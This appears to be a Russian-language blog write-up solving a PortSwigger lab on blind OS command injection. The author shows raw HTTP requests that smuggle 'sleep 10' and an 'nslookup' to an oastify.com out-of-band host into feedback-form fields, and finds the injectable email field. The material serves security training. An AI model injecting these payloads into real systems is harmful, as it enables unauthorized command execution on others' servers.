---
title: "Blind OS command injection with out-of-band interaction"
date: 2025-06-27
tags: [injection, writeup, web]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band"
classes: wide
---

В лабе содержится уязвимость **Blind OS command injection**. Для решения необходимо отправить `DNS` запрос с сервера.

```
https://0a1700670377fbe881bf11c0001400cb.web-security-academy.net/
```

## Solution

Пойду гулять по сайту. Интерес вызвала форма отправки обратной связи. Соберу запрос. А вот и он:

```http
POST /feedback/submit HTTP/2
Host: 0a1700670377fbe881bf11c0001400cb.web-security-academy.net
Cookie: session=LdgQEOLRcZNpwpgaJyQScEUX7svKo61p
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a170040039c75fb804a3f4b00eb005f.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: https://0a170040039c75fb804a3f4b00eb005f.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=eoMBcu5ppx8X1LdESVQjPbY8awXhslM2&name=name&email=email%40mail.com&subject=subject&message=message
```

Отправлю в `Repeater`, чтобы потестить поля. Отправлю `sleep 10` через поля формы:

```http
POST /feedback/submit HTTP/2
Host: 0a1700670377fbe881bf11c0001400cb.web-security-academy.net
Cookie: session=LdgQEOLRcZNpwpgaJyQScEUX7svKo61p
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a170040039c75fb804a3f4b00eb005f.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: https://0a170040039c75fb804a3f4b00eb005f.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=eoMBcu5ppx8X1LdESVQjPbY8awXhslM2&name=sleep 10&email=email%40mail.com&subject=subject&message=message
```

Это не сработало, попробую добавить разделители `||`:

```http
POST /feedback/submit HTTP/2
Host: 0a1700670377fbe881bf11c0001400cb.web-security-academy.net
Cookie: session=LdgQEOLRcZNpwpgaJyQScEUX7svKo61p
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a170040039c75fb804a3f4b00eb005f.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: https://0a170040039c75fb804a3f4b00eb005f.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=eoMBcu5ppx8X1LdESVQjPbY8awXhslM2&name=||sleep 10||&email=email%40mail.com&subject=subject&message=message
```

Все еще нет( Возможно сервер не дожидается обработки запроса, а сразу возвращает ответ. Или же тут нет уязвимости( Попробую использовать `OAST`. То есть я попробую выполнить команду, которая отправит `DNS` запрос на контролируемый мной сервер. Таким образом, если я получу запрос, то уязвимость есть. Если же не получу, то ее нет. Либо же не подходящий способ определения. Ну чтож, буду использовать следующую команду для инъекции:

```bash
nslookup 525tm2a733ae0a44gqp5s89be2kt8jw8.oastify.com
```

Повторю процесс для каждого из полей. Уязвимым оказалось поле `email`:

```http
POST /feedback/submit HTTP/2
Host: 0a1700670377fbe881bf11c0001400cb.web-security-academy.net
Cookie: session=ZP3SAEE4LBuL0ZwxFKpvv5HOiWXVx5Go
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1700670377fbe881bf11c0001400cb.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
Origin: https://0a1700670377fbe881bf11c0001400cb.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=oRntvNOT2etKminxk9L3GoaRwInZLRJk&name=name&email=a||nslookup 525tm2a733ae0a44gqp5s89be2kt8jw8.oastify.com||&subject=subject&message=message
```

Получил запросы в `Burp Collaborator`:

![IMG](/assets/images/IMG_os_command_injection/IMG_Blind_OS_command_injection_with_out-of-band_interaction/1.png){: height="200" .align-center}

Лаба решена)

![IMG](/assets/images/IMG_os_command_injection/IMG_Blind_OS_command_injection_with_out-of-band_interaction/2.png){: height="200" .align-center}
